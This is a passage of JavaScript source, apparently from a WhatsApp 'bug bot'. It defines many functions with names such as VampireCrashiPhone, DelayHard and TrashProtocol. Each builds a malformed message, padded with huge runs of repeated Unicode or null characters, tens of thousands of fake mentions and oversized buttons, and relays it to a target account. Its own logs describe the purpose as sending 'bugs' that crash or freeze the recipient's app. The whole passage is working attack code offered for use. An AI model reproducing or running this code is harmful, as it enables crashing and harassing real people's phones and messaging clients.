  try {
    const message = {
      stickerPackMessage: {
        stickerPackId: "2a020f9c-4701-4a19-8a05-358e5f50706b",
        name: "ꦾ".repeat(10000),
        publisher: "ꦽ".repeat(500),
        stickers: [
          {
            fileName: "SkhRT09I4+K+pKVF3najiKZMW4AHBdeaUCwriuT-isk=.webp",
            isAnimated: false,
            emojis: [""],
            mimetype: "image/webp",
          },
        ],
        fileLength: "99999999",
        fileSha256: "1aYtTgzj90li3Zjl3iqT8qYc33giu9r2XQ2VfvXj6qI=",
        fileEncSha256: "KqlacQ4p7TypiMFnpZxrqWFnP/RJTw5LrEe6Q8BdEV0=",
        mediaKey: "vynzOrLOfRJKq5FR2IO+GiQYWimtLdM2QOMxCLx9W1I=",
        directPath:
          "/v/t62.15575-24/19152401_2707159986150301_6253013717572687839_n.enc",
        mediaKeyTimestamp: "1741245862",
        trayIconFileName: "2a020f9c-4701-4a19-8a05-358e5f50706b.png",
        stickerPackSize: "99999999",
      },
    };

    await vamp.sendMessage(target, message, { quoted: null });
    console.log(`Api Sticker Bug ${target}!`);
  } catch (error) {
    console.error("Error sending bug sticker pack:", error);
  }
}
async function VampireSticker(target) {
  try {
    const message = {
      stickerPackMessage: {
        stickerPackId: "72de8e77-5320-4c69-8eba-ea2d274c5f12",
        name: "ꦽ".repeat(100000),
        publisher: "ꦾ".repeat(100000),
        stickers: [
          {
            fileName: "r6ET0PxYVH+tMk4DOBH2MQYzbTiMFL5tMkMHDWyDOBs=.webp",
            isAnimated: true,
            accessibilityLabel: "yandex",
            isLottie: false,
            mimetype: "image/webp",
          },
        ],
        fileLength: "99999999",
        fileSha256: "+tCLIfRSesicXnxE6YwzaAdjoP0BBfcLsDfCE0fFRls=",
        fileEncSha256: "PJ4lASN6j8g+gRxUEbiS3EahpLhw5CHREJoRQ1h9UKQ=",
        mediaKey: "kX3W6i35rQuRmOtVi6TARgbAm26VxyCszn5FZNRWroA=",
        directPath:
          "/v/t62.15575-24/29608676_1861690974374158_673292075744536110_n.enc",
        mediaKeyTimestamp: "1740922864",
        trayIconFileName: "72de8e77-5320-4c69-8eba-ea2d274c5f12.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/35367658_2063226594091338_6819474368058812341_n.enc",
        thumbnailSha256: "SxHLg3uT9EgRH2wLlqcwZ8M6WCgCfwZuelX44J/Cb/M=",
        thumbnailEncSha256: "EMFLq0BolDqoRLkjRs9kIrF8yRiO+4kNl4PazUKc8gk=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "MjEyOGU2ZWM3NWFjZWRiYjNiNjczMzFiZGRhZjBlYmM1MDI3YTM0ZWFjNTRlMTg4ZjRlZjRlMWRjZGVmYTc1Zg==",
        stickerPackSize: "9999999999",
        stickerPackOrigin: "USER_CREATED",
      },
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          },
        },
        body: {
          text: "xatanicalx",
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
          ],
        },
      },
    };

    const msg = {
      key: {
        remoteJid: target,
        fromMe: true,
        id: `BAE5${Math.floor(Math.random() * 1000000)}`,
      },
      message: message,
    };

    await Dragon.relayMessage(target, message, { messageId: msg.key.id });
    console.log(`Api Sending ${target}!`);
  } catch (error) {
    console.error("Error sending bug sticker pack:", error);
  }
}

async function invisible(target) {
  await Dragon.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Xata Tredict",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );

  console.log(chalk.yellow("VIRUEZZ CORONA"));
}

async function invob(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "XATAAAA" + "꧀".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };

  await Dragon.relayMessage(target, message, {
    participant: {
      jid: target,
    },
  });
  console.log(chalk.yellow("Xatanical Send Bug"));
}

async function VampireInvisIos(target) {
  Dragon.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "makloo" + "ꦻ࣯࣯".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function btnStatus(bijipler, mention) {
  let pesan = await generateWAMessageFromContent(
    bijipler,
    {
      buttonsMessage: {
        text: "🔥",
        contentText: "Xatanical",
        footerText: "Bella",
        buttons: [
          {
            buttonId: ".glitch",
            buttonText: { displayText: "⚡" + "\u0000".repeat(400000) },
            type: 1,
          },
        ],
        headerType: 1,
      },
    },
    {}
  );

  await Dragon.relayMessage("status@broadcast", pesan.message, {
    messageId: pesan.key.id,
    statusJidList: [bijipler],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: bijipler }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      bijipler,
      {
        statusMentionMessage: {
          message: { protocolMessage: { key: pesan.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Maklo" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function NewlesterForceClose(bijipler) {
  await Dragon.relayMessage(
    bijipler,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Helo",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_order",
                  buttonParamsJson: "\u0000".repeat(800000),
                },
              ],
            },
          },
        },
      },
    },
    {},
    {
      messageId: null,
    }
  );
  console.log(chalk.yellow("API SEND BUG"));
}
async function invisblekontak(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "𝐓‌𝐡‌𝐮‌𝐧‌𝐝‌𝐞‌𝐫‌ 𝐯‌‌‌‌𝐨‌‌‌‌‌𝐫‌‌‌𝐭‌‌𝐞‌‌‌𝐱‌‌‌",
                    vcard: `BEGIN:VCARD
VERSION:1.1
FN:𝐓‌𝐡‌𝐮‌𝐧‌𝐝‌𝐞‌𝐫‌ 𝐯‌‌‌‌𝐨‌‌‌‌‌𝐫‌‌‌𝐭‌‌𝐞‌‌‌𝐱‌‌‌‌𝐗‌˼
TEL;type=CELL;type=VOICE;waid=6283849303906:+62 838-4930-3906
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Kai.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function vcardcrash(target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_order",
              buttonParamsJson: JSON.stringify({
                reference_id: Math.random()
                  .toString(36)
                  .substring(2, 10)
                  .toUpperCase(),
                order: {
                  status: "pending",
                  order_type: "ORDER",
                },
                share_payment_status: true,
                call_permission: true,
              }),
            },
            {
              name: "contact",
              buttonParamsJson: JSON.stringify({
                vcard: {
                  full_name: "sockyrine Chema ".repeat(4000),
                  phone_number: "+628217973312",
                  email: "zyrineexploit@iCloud.com",
                  organization: "sockyrine Exploiter",
                  job_title: "Customer Support",
                },
              }),
            },
          ],
          messageParamsJson: JSON.stringify({
            title: "\u200B".repeat(10000),
            body: "GIDEOVA_PAYMENT_STATUSED",
          }),
        },
      },
    },
    { userJid: target }
  );

  await Dragon.relayMessage(target, msg.message, {
    messageId: msg.key.id,
  });
}

async function invisfc(target, mention) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      buttonsMessage: {
        text: "🩸",
        contentText: "Available Xatanical",
        footerText: "©𝟐𝟎𝟐𝟓 Xatanical ༑",
        buttons: [
          {
            buttonId: ".bugs",
            buttonText: {
              displayText: "🇷🇺" + "\u0000".repeat(800000),
            },
            type: 1,
          },
        ],
        headerType: 1,
      },
    },
    {}
  );

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "( ©2025 ) Xata" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function TrashProtocol(target, mention) {
  const sex = Array.from({ length: 9741 }, (_, r) => ({
    title: "᭯".repeat(9741),
    rows: [{ title: `${r + 1}`, id: r + 1 }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "@xatanicvxii",
          listType: 2,
          buttonText: null,
          sections: sex,
          singleSelectReply: { selectedRowId: "🌀" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "( # )",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function VampireBlankIphone(target) {
  try {
    const messsage = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "Selamat Puasa" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };
    await Dragon.relayMessage(target, messsage, {
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampireInvisIphone(target) {
  Dragon.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "ᴠᴀᴍᴘɪʀᴇ ᴄʀᴀsʜ ɪᴏs" + "ꦾ࣯࣯".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}
async function VampireCrashiPhone(target) {
  Dragon.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `Maaf bang` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "Busett ‌" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function VampSpamFc(target) {
  Dragon.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title:
            "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️" +
            "ꦾ".repeat(9000) +
            "@5".repeat(9000),
          hasMediaAttachment: false,
        },
        body: {
          text: "ꦾ".repeat(9000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "form_message",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "send_location",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "view_product",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "payment_status",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function VampFcCall(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "jirlah",
              hasMediaAttachment: false,
            },
            body: {
              text: "\u0003".repeat(9999),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "payment_method",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "form_message",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "send_location",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "view_product",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "payment_status",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Dragon.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function xatafloods(sock, target) {
  const header = {
    locationMessage: {
      degreesLatitude: 0,
      degreesLongitude: 0,
    },
    hasMediaAttachment: true,
  };
  const body = {
    text: "𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄𝚄" + "᭯".repeat(90000),
  };
  const carouselMessage = {
    sections: [
      {
        title: "\u200C".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
      {
        title: "\u200c".repeat(90000),
        rows: [
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
          {
            title: "\u200D".repeat(90000),
            description: "\u200D".repeat(90000),
            rowId: "\u200D".repeat(90000),
          },
        ],
      },
    ],
  };
  await conn.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: header,
            body: body,
            carouselMessage: carouselMessage,
          },
        },
      },
    },
    Ptcp ? { participant: { jid: target } } : { quoted: null }
  );
}

async function CaroUsel(Dragon, target) {
  await Dragon.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
              locationMessage: {},
              hasMediaAttachment: true,
            },
            body: {
              text: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
            },
            nativeFlowMessage: {
              messageParamsJson: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
  console.log(chalk.green("Send Bug By xatanical"));
}

async function delaybugv5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".𝚡𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕¡?" + "ោ៝".repeat(10000),
    title: "Apocalypse",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "𝚡𝚊𝚝𝚊𝚋𝚞𝚐𝚜",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363334766163982@newsletter",
      serverMessageId: 1,
      newsletterName: "χඞ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function lightnight(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Bellakuuu",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function DelayHard(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "Yogzz"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
